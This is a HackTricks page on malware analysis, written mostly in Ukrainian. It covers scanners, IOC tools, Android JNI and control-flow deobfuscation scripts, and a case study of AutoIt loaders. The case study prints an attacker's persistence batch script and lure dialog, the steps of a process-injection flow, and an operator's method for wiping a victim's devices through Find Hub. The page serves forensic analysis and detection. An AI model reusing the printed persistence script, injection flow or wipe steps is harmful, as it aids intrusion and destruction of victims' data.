# Аналіз шкідливого ПЗ

{{#include ../../banners/hacktricks-training.md}}

## Шпаргалки з цифрової криміналістики

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Онлайн-сервіси

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Офлайн антивірусні та інструменти виявлення

### Yara

#### Встановлення
```bash
sudo apt-get install -y yara
```
#### Підготовка правил

Використайте цей скрипт, щоб завантажити та об'єднати всі yara malware rules з github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\  
Створіть директорію _**rules**_ і виконайте скрипт. Це створить файл _**malware_rules.yar**_, який містить усі yara rules для malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Сканування
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Перевірка на malware та створення правил

Ви можете використовувати інструмент [**YaraGen**](https://github.com/Neo23x0/yarGen) для генерації yara rules з бінарного файлу. Ознайомтеся з цими підручниками: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Встановлення
```
sudo apt-get install -y clamav
```
#### Сканування
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** виявляє потенційно шкідливі **capabilities** у виконуваних файлах: PE, ELF, .NET. Тож він знаходить такі речі, як Att\&ck tactics, або підозрілі capabilities, такі як:

- check for OutputDebugString error
- run as a service
- create process

Отримати його можна в [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC означає Indicator Of Compromise. IOC — це набір **умов, які ідентифікують** потенційно небажане програмне забезпечення або підтверджене **malware**. Blue Teams використовують таке визначення, щоб **шукати такі шкідливі файли** у своїх **системах** і **мережах**.\
Ділення такими визначеннями дуже корисне: коли malware виявлено на комп'ютері і створено IOC для цього malware, інші Blue Teams можуть використати його, щоб ідентифікувати malware швидше.

Інструмент для створення або редагування IOCs — [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Ви можете використовувати інструменти, такі як [**Redline**](https://www.fireeye.com/services/freeware/redline.html), щоб **шукати визначені IOCs на пристрої**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) is a scanner for Simple Indicators of Compromise.\
Detection is based on four detection methods:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) — це malware-сканер для Linux, випущений під ліцензією GNU GPLv2, розроблений з урахуванням загроз, притаманних середовищам зі спільним хостингом. Він використовує дані про загрози з систем виявлення вторгнень на краю мережі для вилучення malware, що активно використовується в атаках, і генерує сигнатури для виявлення. Крім того, дані про загрози також надходять із подань користувачів через функцію LMD checkout та з ресурсів спільноти malware.

### rkhunter

Інструменти, такі як [**rkhunter**](http://rkhunter.sourceforge.net), можна використовувати для перевірки файлової системи на наявність можливих **rootkits** та malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) є інструментом, який намагається знайти обфусковані рядки всередині виконуваних файлів за допомогою різних технік.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) перевіряє деякі базові речі всередині виконуваного файлу (бінарні дані, ентропія, URL-и та IP-адреси, деякі yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) є інструментом, який дозволяє отримати інформацію про Windows виконувані файли, такі як імпорти, експорти, заголовки, а також перевіряє VirusTotal і знаходить потенційні Att\&ck техніки.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) — інструмент для визначення, чи файл є **зашифрованим**, а також для виявлення **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) є Python-скриптом, який використовує різноманітні **статистичні методи** для виявлення **обфускованого** та **зашифрованого** вмісту в текстових/скриптових файлах. Призначення NeoPI — допомагати у **виявленні прихованого коду web shell**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) робить усе можливе, щоб виявити **обфускований**/**підозрілий код**, а також файли, що використовують **PHP** функції, які часто застосовуються в **malwares**/webshells.

### Apple Binary Signatures

Під час перевірки **malware sample** ви завжди повинні **перевіряти підпис** бінарного файлу, оскільки **розробник**, який його підписав, може вже бути **пов’язаний** з **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Detection Techniques

### File Stacking

Якщо ви знаєте, що якась папка, яка містить **files** веб-сервера, була **last updated on some date**. **Check** **the date** коли всі **files** на **web server were created and modified**, і якщо якась дата виглядає **suspicious**, перевірте цей файл.

### Baselines

Якщо **the files of a folder shouldn't have been modified**, ви можете обчислити **hash** **of the original files** папки і **compare** їх з **the current**. Будь-що змінене буде **suspicious**.

### Statistical Analysis

Коли інформація зберігається в логах, ви можете **check statistics like how many times each file of a web server was accessed as a web shell might be one of the most**.

---

### Android in-app native telemetry (no root)

На Android можна інструментувати native код всередині процесу цільового додатка, передзавантаживши невелику бібліотеку логера до ініціалізації інших JNI-ліб. Це дає ранню видимість native поведінки без системних hooks або root. Популярний підхід — SoTap: покладіть libsotap.so для потрібного ABI в APK і інжектьте виклик System.loadLibrary("sotap") на ранньому етапі (наприклад, static initializer або Application.onCreate), після чого збирайте логи з internal/external шляхів або використовуйте Logcat як fallback.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Деяке Android malware і RASP-захищені додатки приховують імена методів JNI та їх сигнатури, декодуючи їх під час виконання перед викликом RegisterNatives. Коли інструментування Frida/ptrace блокується anti-debug, ви все одно можете відновити plaintext офлайн, виконуючи вбудований декодер за допомогою angr та потім записавши результати назад у Ghidra як коментарі.

Ключова ідея: розглядати декодер всередині .so як викличну функцію, виконати його на заобфусцованих байтових зразках у .rodata і конкретизувати вихідні байти до першого \x00 (C-string terminator). Забезпечте, щоб angr і Ghidra використовували той самий image base, щоб уникнути невідповідностей адрес.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>Налаштування angr та офлайн виконання декодера</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- У великих масштабах створіть статичну мапу зіставлення call sites до аргументів декодера (encoded_ptr, size). Wrappers можуть приховувати аргументи, тому ви можете створити це відображення вручну з Ghidra xrefs, якщо API recovery видає забагато шуму.

<details>
<summary>Пакетне декодування кількох call sites з використанням angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Анотувати місця викликів у Ghidra
Option A: Jython-only comment writer (use a pre-computed JSON)
- Оскільки angr вимагає CPython3, тримайте деобфускацію та анотацію окремо. Спочатку запустіть наведений вище angr-скрипт, щоб згенерувати decoded_strings.json. Потім запустіть цей Jython GhidraScript, щоб записати PRE_COMMENTs у кожне місце виклику (і включити ім'я функції, яка викликає, для контексту):

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Варіант B: Single CPython script via pyhidra/ghidra_bridge
- Як альтернативу, використовуйте pyhidra або ghidra_bridge, щоб керувати API Ghidra з того самого CPython-процесу, який запускає angr. Це дозволяє викликати decode_string() і одразу встановлювати PRE_COMMENTs без проміжного файлу. Логіка віддзеркалює Jython-скрипт: побудуйте callsite→function map via ReferenceManager, decode with angr, and set comments.

Чому це працює і коли це використовувати
- Offline execution sidesteps RASP/anti-debug: не потрібні ptrace або Frida hooks для відновлення рядків.
- Вирівнювання base_addr в Ghidra і angr (наприклад, 0x00100000) гарантує, що адреси функцій/даних збігаються між інструментами.
- Repeatable recipe for decoders: розглядайте трансформацію як чисту функцію, виділіть вихідний буфер у новому стані, викличте її з (encoded_ptr, out_ptr, len), потім конкретизуйте через state.solver.eval і розберіть C-strings до \x00.

Примітки та підводні камені
- Дотримуйтесь цільового ABI/calling convention. angr.factory.callable обирає його на основі arch; якщо аргументи виглядають зміщеними, вкажіть cc явно.
- Якщо декодер очікує обнулені вихідні буфери, ініціалізуйте outbuf нулями в state перед викликом.
- Для position-independent Android .so завжди вказуйте base_addr, щоб адреси в angr співпадали з тими, що бачить Ghidra.
- Використовуйте currentProgram.getReferenceManager() для перерахування call-xrefs навіть якщо додаток обгортає декодер тонкими stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Розкодування динамічного Control-Flow (JMP/CALL RAX Dispatchers)

Сучасні malware families широко зловживають обфускацією Control-Flow Graph (CFG): замість прямого jump/call вони обчислюють місце призначення під час виконання і виконують `jmp rax` або `call rax`. Невеликий *dispatcher* (зазвичай дев'ять інструкцій) встановлює фінальну ціль залежно від прапорів CPU `ZF`/`CF`, повністю порушуючи статичне відновлення CFG.

Техніку – продемонстровану завантажувачем SLOW#TEMPEST – можна подолати трьохкроковим робочим процесом, який опирається лише на IDAPython і Unicorn CPU emulator.

### 1. Знайдіть кожен indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Витягти байт-код диспетчера
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Емулюйте це двічі з Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Запустіть `run(code,0,0)` та `run(code,1,1)`, щоб отримати *false* і *true* цілі переходів.

### 4. Відновіть прямий jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Після патчування примусьте IDA повторно проаналізувати функцію, щоб відновити повний CFG і вихід Hex-Rays:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Label indirect API calls

Після того, як відоме реальне призначення кожного `call rax`, ви можете вказати IDA це, щоб типи параметрів і імена змінних відновлювалися автоматично:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Практичні переваги

* Відновлює реальний CFG → декомпіляція збільшується з *10* рядків до тисяч.
* Дає змогу string-cross-reference & xrefs, роблячи відновлення поведінки тривіальним.
* Скрипти можна повторно використовувати: помістіть їх у будь-який loader, захищений тим самим трюком.

---

## Завантажувачі на основі AutoIt: .a3x дешифрування, маскування Task Scheduler і інжекція RAT

Цей шаблон вторгнення поєднує підписаний MSI, AutoIt loaders, скомпільовані в .a3x, та завдання Task Scheduler, що маскується під нешкідливий додаток.

### MSI → custom actions → AutoIt оркестратор

Дерево процесів та команди, виконувані MSI custom actions:

- MsiExec.exe → cmd.exe для запуску install.bat
- WScript.exe щоб показати підробний діалог помилки
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (скидає loader, встановлює persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (приманка для користувача):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Ключові артефакти та маскування:
- Drops AutoIt3.exe and IoKlTr.au3 to C:\Users\Public\Music
- Copies schtasks.exe to hwpviewer.exe (маскується під Hangul Word Processor viewer)
- Creates a scheduled task "IoKlTr" that runs every 1 minute
- Startup LNK seen as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Stages modules under %APPDATA%\Google\Browser\ subfolders containing `adb` or `adv` and starts them via autoit.vbs/install.bat helpers

Поради для судово-експертного триажу:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Look for renamed copies of schtasks.exe co-located with Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Common paths: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Корелюйте створення процесів: AutoIt3.exe запускає легітимні Windows бінарні файли (наприклад, cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules are compiled with `#AutoIt3Wrapper_Outfile_type=a3x` and decrypt embedded payloads before injecting into benign processes.
- Спостережувані сімейства: QuasarRAT (injected into hncfinder.exe) and RftRAT/RFTServer (injected into cleanmgr.exe), as well as RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Діаграма розшифрування: виводять AES-ключ через HMAC, розшифровують вбудований blob, після чого інжектять розшифрований модуль.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Загальний потік ін'єкції (CreateRemoteThread-style):
- CreateProcess (suspended) of the target host (e.g., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory with decrypted module/shellcode
- CreateRemoteThread or QueueUserAPC to execute payload

Ідеї для виявлення
- AutoIt3.exe parented by MsiExec.exe or WScript.exe spawning system utilities
- Files with `.a3x` extensions or AutoIt script runners under public/user-writable paths
- Suspicious scheduled tasks executing AutoIt3.exe or binaries not signed by Microsoft, with minute-level triggers

### Зловживання захопленням облікового запису через Android Find My Device (Find Hub)

Під час вторгнення у Windows оператори використовували вкрадені облікові дані Google, щоб неодноразово очищати Android-пристрої жертви, пригнічуючи сповіщення, поки розширювали доступ через десктопний месенджер жертви, в якому був виконаний вхід.

Кроки оператора (із сесії браузера з виконаним входом):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## AdaptixC2: Витягнення конфігурації та TTPs

Див. окрему сторінку:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Джерела

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
